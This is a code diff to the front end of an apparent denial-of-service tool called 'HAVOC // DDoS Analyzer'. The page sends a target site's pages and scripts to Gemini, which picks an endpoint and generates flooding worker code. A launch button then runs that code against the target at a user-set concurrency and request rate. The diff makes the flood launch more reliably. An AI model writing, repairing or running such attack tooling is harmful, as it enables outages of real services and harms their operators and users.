@@ -3,6 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
+<link rel="icon" href="data:," />
 <title>HAVOC // DDoS Analyzer</title>
 <style>
   :root { --bg:#07090c; --panel:#0e1319; --line:#1c2733; --red:#ff3b3b; --grn:#3dff8f; --txt:#c9d6e2; --dim:#5a6b7d; }
@@ -77,8 +78,7 @@
 </div>
 
 <script>
-let worker = null;
-let startTs = null;
+let worker = null, startTs = null, analysis = null;
 const $ = (id) => document.getElementById(id);
 $('conc').oninput = e => $('cval').textContent = e.target.value;
 $('rps').oninput = e => $('rval').textContent = e.target.value;
@@ -96,6 +96,7 @@ $('scan').onclick = async () => {
   $('scan').disabled = true;
   $('status').textContent = 'Fetching target + scripts, sending to Gemini… (up to 60s)';
   $('results').style.display = 'none';
+  $('liveErr').textContent = '';
   try {
     const r = await fetch('/api/scan', {
       method: 'POST',
@@ -104,11 +105,13 @@ $('scan').onclick = async () => {
     });
     const d = await r.json();
     if (!r.ok) throw new Error(d.error || 'scan failed');
-    const a = d.analysis;
+    analysis = d.analysis;
+    const a = analysis;
     $('status').textContent =
-      `Fetched ${d.fetched_pages} page(s) / ${(d.total_js_bytes/1024).toFixed(0)}KB JS — source: ${d.source}`;
+      `Fetched ${d.fetched_pages} page(s) / ${(d.total_js_bytes/1024).toFixed(0)}KB JS — source: ${d.source}` +
+      (d.api_error ? ' — [' + d.api_error + ']' : '');
     $('epinfo').textContent =
-      `TARGET : ${a.target}\nMETHOD : ${a.method}\nHEADERS: ${JSON.stringify(a.headers)}\nBODY   : ${String(a.body).slice(0,400)}\nWHY    : ${a.rationale}`;
+      `TARGET : ${a.target}\nMETHOD : ${a.method}\nHEADERS: ${JSON.stringify(a.headers)}\nBODY   : ${String(typeof a.body === 'string' ? a.body : JSON.stringify(a.body)).slice(0,400)}\nWHY    : ${a.rationale}`;
     $('epList').innerHTML = (d.endpoints || []).map(e =>
       `<div class="ep"><b>${e.score.toFixed(1)}</b> ${e.url}</div>`).join('');
     $('code').textContent = a.worker_code || '(none)';
@@ -120,16 +123,18 @@ $('scan').onclick = async () => {
 };
 
 $('launch').onclick = () => {
-  const src = $('code').textContent.trim();
+  if (!analysis) return;
+  const src = String(analysis.worker_code || '').trim();
   if (!src) return;
   stopWorker();
+  let w;
   try {
-    worker = new Worker(URL.createObjectURL(new Blob([src], { type: 'application/javascript' })));
+    w = new Worker(URL.createObjectURL(new Blob([src], { type: 'application/javascript' })));
   } catch (e) {
     $('liveErr').textContent = 'Worker failed to spawn: ' + e.message;
     return;
   }
-  worker.onmessage = (e) => {
+  w.onmessage = (e) => {
     if (e.data && e.data.type === 'stats') {
       $('sDone').textContent = e.data.done;
       $('sFail').textContent = e.data.failed;
@@ -137,16 +142,18 @@ $('launch').onclick = () => {
       $('sUp').textContent = ((Date.now() - startTs) / 1000).toFixed(1) + 's';
     }
   };
-  worker.onerror = (e) => { $('liveErr').textContent = e.message || 'worker error'; };
+  w.onerror = (e) => { $('liveErr').textContent = e.message || 'worker error'; };
+  worker = w;
   startTs = Date.now();
   $('launch').disabled = true;
   $('stop').disabled = false;
+  const body = typeof analysis.body === 'string' ? analysis.body : JSON.stringify(analysis.body);
   worker.postMessage({
     action: 'start',
-    url: $('epinfo').textContent.match(/TARGET : (.+)/)[1].trim(),
-    method: 'POST',
-    headers: JSON.parse($('epinfo').textContent.match(/HEADERS: (.+)/)[1]),
-    body: JSON.parse(JSON.stringify(JSON.parse($('epinfo').textContent.match(/BODY   : (.+)/)[1]))),
+    url: analysis.target,
+    method: analysis.method || 'POST',
+    headers: analysis.headers || {},
+    body,
     concurrency: +$('conc').value,
     rps: +$('rps').value,
   });
